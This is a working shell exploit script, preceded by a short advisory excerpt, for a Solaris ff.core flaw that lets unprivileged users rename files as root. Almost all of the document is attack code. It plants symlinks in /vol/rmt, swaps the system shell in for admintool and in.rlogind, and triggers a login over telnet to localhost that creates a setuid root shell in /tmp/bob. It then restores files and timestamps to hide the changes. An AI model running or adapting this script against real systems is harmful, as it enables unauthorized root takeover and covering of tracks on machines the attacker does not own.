#source: http://www.securityfocus.com/bid/327/info
#
#There is a vulnerability in Solaris's ff.core utility which allows normal users to execute the rename command as root. This particular bug when leveraged against a series of other configuration issues in a standard Solaris setup can lead to a root compromise. An example of this attack executed via the ff.core rename attack could be as follows:
#
#1. rename /usr/bin/sh /usr/bin/admintool
#2. rename /usr/sbin/swmtool /usr/sbin/in.rlogind
#3. telnet localhost login and clean up
#
#Detailed messages concerning this problem and related fixes are attached to this Vulnerability in the Referance section. 
#
#CORE has developed a working commercial exploit for their IMPACT product. This exploit is not otherwise publicly available or known to be circulating in the wild.
#
#The following exploit was provided:

#!/bin/sh

# /usr/openwin/bin/ff.core exploit - horizon
# tested on 2.5.1, 2.6 and Solaris 7 (2.7)
# thanks to joej, adm, and joej :>

# if you want to exploit 2.5, you can just make this move /etc/group over
# /etc/shadow. you will probably want to move /etc/shadow to /etc/s.bak

# first test if we can pull this off

echo "Testing if exploit is possible..."

if [ -x /usr/openwin/bin/ff.core ]
then
:
else
echo "ff.core isn't there or executable. :/"
exit 1
fi

if [ -w /vol/rmt ]
then
:
else
echo "We can't do the symlink. :<"
exit 1
fi

mkdir /tmp/.test42
touch /tmp/.test42/bob

rm -f /vol/rmt/diskette0
ln -fs /tmp/.test42 /vol/rmt/diskette0
/usr/openwin/bin/ff.core -r /vol/rmt/diskette0/bob jim /floppy/ 2>/dev/null

if [ -f /tmp/.test42/jim ]
then
echo "Test successful. Proceeding..."
else
echo "Hmmm.. doesn't look like this is going to work :/"
exit 1
fi

rm -rf /tmp/.test42

# lets make some backups

echo "Backing up clobbered files to /tmp/.bk"

mkdir /tmp/.bk
#save admintools times
touch /tmp/.bk/admintool
touch -r /usr/bin/admintool /tmp/.bk/admintool
#save rloginds times
touch /tmp/.bk/in.rlogind
touch -r /usr/sbin/in.rlogind /tmp/.bk/in.rlogind
#save a copy of /usr/bin/sh
cp /usr/bin/sh /tmp/.bk
touch -r /usr/bin/sh /tmp/.bk/sh

echo "Doing sploit..."

rm -f /vol/rmt/diskette0
ln -fs /usr/bin /vol/rmt/diskette0
/usr/openwin/bin/ff.core -r /vol/rmt/diskette0/admintool admintool.bak /floppy/ 2>/dev/null

rm -f /vol/rmt/diskette0
ln -fs /usr/bin /vol/rmt/diskette0
/usr/openwin/bin/ff.core -r /vol/rmt/diskette0/sh admintool /floppy/ 2>/dev/null

rm -f /vol/rmt/diskette0
ln -fs /usr/sbin /vol/rmt/diskette0
/usr/openwin/bin/ff.core -r /vol/rmt/diskette0/in.rlogind in.rlogind.bak /floppy/ 2>/dev/null

rm -f /vol/rmt/diskette0
ln -fs /usr/sbin /vol/rmt/diskette0
/usr/openwin/bin/ff.core -r /vol/rmt/diskette0/swmtool in.rlogind /floppy/ 2>/dev/null

echo "Done with sploit. Testing and trying to clean up now..."

sleep 1

(sleep 2;echo " cp /bin/rksh /tmp/bob; chmod 4755 /tmp/bob; exit; ") | telnet localhost login

sleep 1

if [ -f /tmp/bob ]
then
echo "w00p! Should have a suid root sh in /tmp/bob"
echo "btw, its rksh because solaris is silly"
echo "Let me try to clean up my mess..."
else
echo "hrmmph.. didnt work. hope shits not screwed up bad :/"
exit 1
fi

echo "
cp /tmp/.bk/sh /usr/bin/sh
chmod 555 /usr/bin/sh
chown bin /usr/bin/sh
chgrp root /usr/bin/sh
touch -r /tmp/.bk/sh /usr/bin/sh
mv /usr/bin/admintool.bak /usr/bin/admintool
touch -r /tmp/.bk/admintool /usr/bin/admintool
rm -f /usr/sbin/swmtool
ln -s /usr/bin/admintool /usr/sbin/swmtool
touch -r /usr/bin/admintool /usr/sbin/swmtool
rm -f /usr/sbin/in.rlogind
mv /usr/sbin/in.rlogind.bak /usr/sbin/in.rlogind
touch -r /tmp/.bk/in.rlogind /usr/sbin/in.rlogind
rm -rf /tmp/.bk
" | /tmp/bob

echo "everything should be cool.. i think :>"
/tmp/bob